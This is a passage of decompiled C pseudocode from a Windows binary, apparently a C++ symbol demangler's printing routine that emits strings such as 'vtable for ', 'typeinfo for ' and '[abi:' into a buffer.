= *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404c90:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"virtual thunk to \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404d10:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"non-virtual thunk to \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404d90:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"typeinfo name for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404e10:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"typeinfo fn for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404e90:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"typeinfo for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404f10:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"construction vtable for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        pcVar17 = \"-in-\";\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar11 = *(arg1 + 0x100);\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x404f90:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"vtable for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405010:\n        iVar11 = *(arg1 + 0x100);\n        pcVar17 = \"VTT for \";\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405090:\n        iVar11 = *(arg1 + 0x100);\n        if (iVar11 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar12 = 1;\n            iVar11 = 0;\n        }\n        else {\n            iVar12 = iVar11 + 1;\n        }\n        *(arg1 + 0x100) = iVar12;\n        arg1[iVar11] = 0x7e;\n        arg1[0x108] = 0x7e;\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x4050d0:\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x4050e3:\n        uVar4 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        pppppppcVar22 = arg3[1];\n        if (pppppppcVar22 == NULL) {\ncode_r0x0040794e:\n            *(arg1 + 0x130) = 1;\n        }\n        else {\n            ppppppppcVar15 = *(arg1 + 0x120);\n            uVar6 = 0;\n            ppppppppcVar9 = appppppppcStack200;\n            ppppppppcVar8 = NULL;\n            do {\n                ppppppppcVar13 = ppppppppcVar9;\n                *ppppppppcVar13 = ppppppppcVar8;\n                iVar26 = *pppppppcVar22;\n                uVar6 = uVar6 + 1;\n                *(arg1 + 0x128) = ppppppppcVar13;\n                ppppppppcVar13[1] = pppppppcVar22;\n                *(ppppppppcVar13 + 2) = 0;\n                ppppppppcVar13[3] = ppppppppcVar15;\n                if (4 < iVar26 - 0x1cU) {\n                    if (iVar26 == 4) {\n                        *(arg1 + 0x120) = &ppppppppcStack216;\n                        ppppppppcStack216 = ppppppppcVar15;\n                        pppppppcStack208 = pppppppcVar22;\n                    }\n                    else if (iVar26 == 2) {\n                        pppppppcVar16 = pppppppcVar22[2];\n                        iVar26 = *pppppppcVar16;\n                        if (iVar26 != 0x45) goto code_r0x004051d4;\n                        while( true ) {\n                            pppppppcVar16 = pppppppcVar16[1];\n                            iVar26 = *pppppppcVar16;\ncode_r0x004051d4:\n                            if (4 < iVar26 - 0x1cU) break;\n                            if (uVar6 == 4) {\n                                *(arg1 + 0x130) = 1;\n                                return iVar26 - 0x1cU;\n                            }\n                            uVar7 = uVar6 - 1;\n                            uVar10 = uVar6;\n                            uVar6 = uVar6 + 1;\n                            appppppppcStack200[uVar10 * 4] = appppppppcStack200[uVar7 * 4];\n                            appppppppcStack200[uVar10 * 4 + 1] = appppppppcStack200[uVar7 * 4 + 1];\n                            (&piStack184)[uVar10 * 4] = (&piStack184)[uVar7 * 4];\n                            (&piStack184)[uVar10 * 4 + 1] = (&piStack184)[uVar7 * 4 + 1];\n                            appppppppcStack200[uVar10 * 4] = appppppppcStack200 + uVar7 * 4;\n                            appppppppcStack200[uVar7 * 4 + 1] = pppppppcVar16;\n                            *(arg1 + 0x128) = appppppppcStack200 + uVar10 * 4;\n                            *(&piStack184 + uVar7 * 4) = 0;\n                            (&piStack184)[uVar7 * 4 + 1] = ppppppppcVar15;\n                        }\n                    }\n                    ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n                    if (*pppppppcVar22 == 4) {\n                        *(arg1 + 0x120) = ppppppppcStack216;\n                        ppppppppcVar9 = ppppppppcStack216;\n                    }\n                    while (uVar6 != 0) {\n                        uVar6 = uVar6 - 1;\n                        uVar7 = uVar6;\n                        ppppppppcVar9 = uVar7 * 0x20;\n                        if (*(&piStack184 + uVar7 * 4) == 0) {\n                            iVar11 = *(arg1 + 0x100);\n                            if (iVar11 == 0xff) {\n                                arg1[0xff] = 0;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                iVar11 = 0;\n                            }\n                            pppppppcVar22 = appppppppcStack200[uVar7 * 4 + 1];\n                            *(arg1 + 0x100) = iVar11 + 1;\n                            arg1[iVar11] = 0x20;\n                            arg1[0x108] = 0x20;\n                            ppppppppcVar9 = fcn.00407fc0(arg1, arg2_00, pppppppcVar22);\n                        }\n                    }\n                    *(arg1 + 0x128) = uVar4;\n                    return ppppppppcVar9;\n                }\n                pppppppcVar22 = pppppppcVar22[1];\n                ppppppppcVar9 = ppppppppcVar13;\n                if (pppppppcVar22 == NULL) goto code_r0x0040794e;\n                ppppppppcVar9 = ppppppppcVar13 + 4;\n                ppppppppcVar8 = ppppppppcVar13;\n            } while (uVar6 != 4);\n            *(arg1 + 0x130) = 1;\n        }\n        break;\n    case 0x405252:\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar11 = *(arg1 + 0x100);\n        if ((arg2 & 4) == 0) {\n            puVar18 = 0x42d8d4;\n            do {\n                uVar28 = *puVar18;\n                if (iVar11 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar12 = 0;\n                    iVar11 = 1;\n                }\n                else {\n                    iVar12 = iVar11;\n                    iVar11 = iVar11 + 1;\n                }\n                puVar18 = puVar18 + 1;\n                *(arg1 + 0x100) = iVar11;\n                arg1[iVar12] = uVar28;\n                arg1[0x108] = uVar28;\n            } while (puVar18 != 0x42d8d6);\n        }\n        else {\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 1;\n                iVar11 = 0;\n            }\n            else {\n                iVar12 = iVar11 + 1;\n            }\n            *(arg1 + 0x100) = iVar12;\n            arg1[iVar11] = 0x2e;\n            arg1[0x108] = 0x2e;\n        }\n        pppppppcVar22 = arg3[2];\n        if (*pppppppcVar22 == 0x45) {\n            iVar11 = *(arg1 + 0x100);\n            pcVar17 = \"{default arg#\";\n            do {\n                cVar23 = *pcVar17;\n                if (iVar11 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar12 = 0;\n                    iVar11 = 1;\n                }\n                else {\n                    iVar12 = iVar11;\n                    iVar11 = iVar11 + 1;\n                }\n                pcVar17 = pcVar17 + 1;\n                *(arg1 + 0x100) = iVar11;\n                arg1[iVar12] = cVar23;\n                arg1[0x108] = cVar23;\n            } while (pcVar17 != \"\");\n            ppppppppcVar9 = appppppppcStack200;\n            sub.msvcrt.dll_sprintf(ppppppppcVar9, 0x42d8e5, *(pppppppcVar22 + 2) + 1);\n            ppppppppcVar15 = ppppppppcVar9;\n            do {\n                ppppppppcVar8 = ppppppppcVar15;\n                uVar5 = *ppppppppcVar8 + 0xfefefeff & ~*ppppppppcVar8;\n                uVar6 = uVar5 & 0x80808080;\n                ppppppppcVar15 = ppppppppcVar8 + 4;\n            } while (uVar6 == 0);\n            bVar29 = (uVar5 & 0x8080) == 0;\n            if (bVar29) {\n                uVar6 = uVar6 >> 0x10;\n            }\n            if (bVar29) {\n                ppppppppcVar15 = ppppppppcVar8 + 6;\n            }\n            puVar18 = ppppppppcVar15 + ((-3 - CARRY1(uVar6, uVar6)) - ppppppppcVar9);\n            if (puVar18 == NULL) {\n                iVar11 = *(arg1 + 0x100);\n            }\n            else {\n                ppppppppcVar15 = puVar18 + ppppppppcVar9;\n                iVar12 = *(arg1 + 0x100);\n                do {\n                    uVar28 = *ppppppppcVar9;\n                    if (iVar12 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar11 = 1;\n                        iVar12 = 0;\n                    }\n                    else {\n                        iVar11 = iVar12 + 1;\n                    }\n                    ppppppppcVar9 = ppppppppcVar9 + 1;\n                    *(arg1 + 0x100) = iVar11;\n                    arg1[iVar12] = uVar28;\n                    arg1[0x108] = uVar28;\n                    iVar12 = iVar11;\n                } while (ppppppppcVar9 != ppppppppcVar15);\n            }\n            puVar18 = 0x42d8e9;\n            do {\n                uVar28 = *puVar18;\n                if (iVar11 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar12 = 0;\n                    iVar11 = 1;\n                }\n                else {\n                    iVar12 = iVar11;\n                    iVar11 = iVar11 + 1;\n                }\n                puVar18 = puVar18 + 1;\n                *(arg1 + 0x100) = iVar11;\n                arg1[iVar12] = uVar28;\n                arg1[0x108] = uVar28;\n            } while (puVar18 != 0x42d8ec);\n            pppppppcVar22 = pppppppcVar22[1];\n        }\n        ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, pppppppcVar22);\n        break;\n    case 0x4052e0:\n        if ((arg2 & 4) == 0) {\n            uVar6 = *(arg3 + 2);\n            pppppppcVar22 = arg3[1];\n            if (uVar6 != 0) {\n                ppppppppcVar15 = *(arg1 + 0x100);\n                iVar11 = 1;\n                do {\n                    uVar28 = *(pppppppcVar22 + iVar11 + -1);\n                    if (ppppppppcVar15 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppppppppcVar9 = NULL;\n                        ppppppppcVar15 = 0x1;\n                    }\n                    else {\n                        ppppppppcVar9 = ppppppppcVar15;\n                        ppppppppcVar15 = ppppppppcVar15 + 1;\n                    }\n                    iVar11 = iVar11 + 1;\n                    *(arg1 + 0x100) = ppppppppcVar15;\n                    arg1[ppppppppcVar9] = uVar28;\n                    arg1[0x108] = uVar28;\n                } while (iVar11 != uVar6 + 1);\n            }\n        }\n        else {\n            pppppppcVar22 = arg3[1];\n            pppppppcVar16 = pppppppcVar22 + *(arg3 + 2);\n            while (pppppppcVar22 < pppppppcVar16) {\n                cVar23 = *pppppppcVar22;\n                if (((3 < pppppppcVar16 - pppppppcVar22) && (cVar23 == '_')) &&\n                   ((*(pppppppcVar22 + 1) == '_' &&\n                    ((*(pppppppcVar22 + 2) == 'U' && (pppppppcVar27 = pppppppcVar22 + 3,  pppppppcVar27 < pppppppcVar16)\n                     ))))) {\n                    uVar6 = 0;\n                    do {\n                        cVar2 = *pppppppcVar27;\n                        iVar26 = cVar2;\n                        if (cVar2 - 0x30U < 10) {\n                            iVar26 = iVar26 + -0x30;\n                        }\n                        else if (cVar2 + 0xbfU < 6) {\n                            iVar26 = iVar26 + -0x37;\n                        }\n                        else {\n                            if (5 < cVar2 + 0x9fU) {\n                                cVar23 = '_';\n                                if (((pppppppcVar16 <= pppppppcVar27) || (cVar2 != '_')) ||\n                                   (cVar23 = cVar2,  0xff < uVar6)) goto code_r0x00407200;\n                                if (*(arg1 + 0x100) == 0xff) {\n                                    arg1[0xff] = 0;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                    *(arg1 + 0x100) = 0;\n                                }\n                                ppppppppcVar9 = *(arg1 + 0x100);\n                                *(arg1 + 0x100) = ppppppppcVar9 + 1;\n                                arg1[ppppppppcVar9] = uVar6;\n                                arg1[0x108] = uVar6;\n                                goto code_r0x00407229;\n                            }\n                            iVar26 = iVar26 + -0x57;\n                        }\n                        pppppppcVar27 = pppppppcVar27 + 1;\n                        uVar6 = uVar6 * 0x10 + iVar26;\n                    } while (pppppppcVar27 != pppppppcVar16);\n                    cVar23 = '_';\n                }\ncode_r0x00407200:\n                ppppppppcVar9 = *(arg1 + 0x100);\n                if (ppppppppcVar9 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar11 = 1;\n                    ppppppppcVar9 = NULL;\n                }\n                else {\n                    iVar11 = ppppppppcVar9 + 1;\n                }\n                *(arg1 + 0x100) = iVar11;\n                arg1[ppppppppcVar9] = cVar23;\n                arg1[0x108] = cVar23;\n                pppppppcVar27 = pppppppcVar22;\ncode_r0x00407229:\n                pppppppcVar22 = pppppppcVar27 + 1;\n            }\n        }\n        break;\n    case 0x405370:\n        pcVar17 = \" [clone \";\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar11 = *(arg1 + 0x100);\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        fcn.00407f90(arg1, arg2_00, arg3[2]);\n        ppppppppcVar9 = *(arg1 + 0x100);\n        if (ppppppppcVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar11 = 1;\n            ppppppppcVar9 = NULL;\n        }\n        else {\n            iVar11 = ppppppppcVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar11;\n        arg1[ppppppppcVar9] = 0x5d;\n        arg1[0x108] = 0x5d;\n        break;\n    case 0x4053f2:\n        pcVar17 = \"[abi:\";\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar11 = *(arg1 + 0x100);\n        do {\n            cVar23 = *pcVar17;\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar12 = 0;\n                iVar11 = 1;\n            }\n            else {\n                iVar12 = iVar11;\n                iVar11 = iVar11 + 1;\n            }\n            pcVar17 = pcVar17 + 1;\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = cVar23;\n            arg1[0x108] = cVar23;\n        } while (pcVar17 != \"\");\n        fcn.00407f90(arg1, arg2_00, arg3[2]);\n        ppppppppcVar9 = *(arg1 + 0x100);\n        if (ppppppppcVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar11 = 1;\n            ppppppppcVar9 = NULL;\n        }\n        else {\n            iVar11 = ppppppppcVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar11;\n        arg1[ppppppppcVar9] = 0x5d;\n        arg1[0x108] = 0x5d;\n        break;\n    case 0x405480:\n        ppppppppcVar9 = fcn.00402080(arg1, arg3 + 1);\n        if (ppppppppcVar9 != NULL) {\n            if (*ppppppppcVar9 != 0x2f) {\ncode_r0x0040549e:\n                puVar3 = *(arg1 + 0x120);\n                *(arg1 + 0x120) = *puVar3;\n                ppppppppcVar9 = fcn.00407f90(arg1, arg2_00, ppppppppcVar9);\n                *(arg1 + 0x120) = puVar3;\n                return ppppppppcVar9;\n            }\n            iVar26 = *(arg1 + 0x134);\n            while (0 < iVar26) {\n                ppppppppcVar9 = ppppppppcVar9[2];\n                iVar26 = iVar26 + -1;\n                if ((ppppppppcVar9 == NULL) || (*ppppppppcVar9 != 0x2f)) goto code_r0x00406f6a;\n            }\n            if ((iVar26 == 0) && (ppppppppcVar9 = ppppppppcVar9[1],  ppppppppcVar9 != NULL)) goto code_r0x0040549e;\n        }\ncode_r0x00406f6a:\n        *(arg1 + 0x130) = 1;\n        break;\n    case 0x4054d0:\n        uVar4 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        pppppppcVar22 = arg3[1];\n        if ((((arg2 & 4) == 0) || (*pppppppcVar22 != 0)) || (bVar29 = *(pppppppcVar22 + 2) == 6,  !bVar29)) {\ncode_r0x004054ff:\n            fcn.00407f90(arg1, arg2_00, pppppppcVar22);\n            if (arg1[0x108] == '<') {\n                iVar11 = *(arg1 + 0x100);\n                if (iVar11 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar11 = 0;\n                }\n                iVar12 = iVar11 + 1;\n                *(arg1 + 0x100) = iVar12;\n                arg1[iVar11] = 0x20;\n                arg1[0x108] = 0x20;\n            }\n            else {\n                iVar12 = *(arg1 + 0x100);\n            }\n            if (iVar12 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar11 = 1;\n                iVar12 = 0;\n            }\n            else {\n                iVar11 = iVar12 + 1;\n            }\n            *(arg1 + 0x100) = iVar11;\n            arg1[iVar12] = 0x3c;\n            arg1[0x108] = 0x3c;\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            if (arg1[0x108] == '>') {\n                iVar11 = *(arg1 + 0x100);\n                if (iVar11 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar11 = 0;\n                }\n                ppppppppcVar9 = iVar11 + 1;\n                *(arg1 + 0x100) = ppppppppcVar9;\n                arg1[iVar11] = 0x20;\n                arg1[0x108] = 0x20;\n            }\n            else {\n                ppppppppcVar9 = *(arg1 + 0x100);\n            }\n            if (ppppppppcVar9 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar11 = 1;\n                ppppppppcVar9 = NULL;\n            }\n            else {\n                iVar11 = ppppppppcVar9 + 1;\n            }\n            *(arg1 + 0x100) = iVar11;\n            arg1[ppppppppcVar9] = 0x3e;\n            arg1[0x108] = 0x3e;\n        }\n        else {\n            iVar11 = 6;\n            ppppppcVar19 = pppppppcVar22[1];\n            pcVar17 = \"JArray\";\n            do {\n                if (iVar11 == 0) break;\n                iVar11 = iVar11 + -1;\n                bVar29 = *ppppppcVar19 == *pcVar17;\n                ppppppcVar19 = ppppppcVar19 + 1;\n                pcVar17 = pcVar17 + 1;\n            } while (bVar29);\n            if (!bVar29) goto code_r0x004054ff;\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            ppppppppcVar9 = fcn.004046f0(arg1, 0x42d8f4);\n        }\n        *(arg1 + 0x128) = uVar4;\n        break;\n    case 0x405590:\n        uVar6 = *(arg3 + 1);\n        ppppppppcVar15 = *(arg1 + 0x100);\n        if (uVar6 == 0) {\n            pcVar17 = \"this\";\n            do {\n                cVar23 = *pcVar17;\n                if (ppppppppcVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppppppppcVar9 = NULL;\n                    ppppppppcVar15 = 0x1;\n                }\n                else {\n                    ppppppppcVar9 = ppppppppcVar15;\n                    ppppppppcVar15 = ppppppppcVar15 + 1;\n                }\n                pcVar17 = pcVar17 + 1;\n                *(arg1 + 0x100) = ppppppppcVar15;\n                arg1[ppppppppcVar9] = cVar23;\n                arg1[0x108] = cVar23;\n            } while (pcVar17 != \"\");\n        }\n        else {\n            pcVar17 = \"{parm#\";\n            do {\n                cVar23 = *pcVar17;\n                if (ppppppppcVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppppppppcVar9 = NULL;\n                    ppppppppcVar15 = 0x1;\n                }\n                else {\n                    ppppppppcVar9 = ppppppppcVar15;\n                    ppppppppcVar15 = ppppppppcVar15 + 1;\n                }\n                pcVar17 = pcVar17 + 1;\n                *(arg1 + 0x100) = ppppppppcVar15;\n                arg1[ppppppppcVar9] = cVar23;\n                arg1[0x108] = cVar23;\n            } while (pcVar17 != \"\");\n            ppppppppcVar9 = appppppppcStack200;\n            sub.msvcrt.dll_sprintf(ppppppppcVar9, 0x42d8e5, uVar6);\n            ppppppppcVar15 = ppppppppcVar9;\n            do {\n                ppppppppcVar8 = ppppppppcVar15;\n                uVar5 = *ppppppppcVar8 + 0xfefefeff & ~*ppppppppcVar8;\n                uVar6 = uVar5 & 0x80808080;\n                ppppppppcVar15 = ppppppppcVar8 + 4;\n            } while (uVar6 == 0);\n            bVar29 = (uVar5 & 0x8080) == 0;\n            if (bVar29) {\n                uVar6 = uVar6 >> 0x10;\n            }\n            if (bVar29) {\n                ppppppppcVar15 = ppppppppcVar8 + 6;\n            }\n            puVar18 = ppppppppcVar15 + ((-3 - CARRY1(uVar6, uVar6)) - ppppppppcVar9);\n            if (puVar18 == NULL) {\n                iVar11 = *(arg1 + 0x100);\n            }\n            else {\n                iVar11 = *(arg1 + 0x100);\n                ppppppppcVar15 = puVar18 + ppppppppcVar9;\n                do {\n                    uVar28 = *ppppppppcVar9;\n                    if (iVar11 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar12 = 0;\n                        iVar11 = 1;\n                    }\n                    else {\n                        iVar12 = iVar11;\n                        iVar11 = iVar11 + 1;\n                    }\n                    ppppppppcVar9 = ppppppppcVar9 + 1;\n                    *(arg1 + 0x100) = iVar11;\n                    arg1[iVar12] = uVar28;\n                    arg1[0x108] = uVar28;\n                } while (ppppppppcVar9 != ppppppppcVar15);\n            }\n            if (iVar11 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppppppppcVar9 = 0x1;\n                iVar11 = 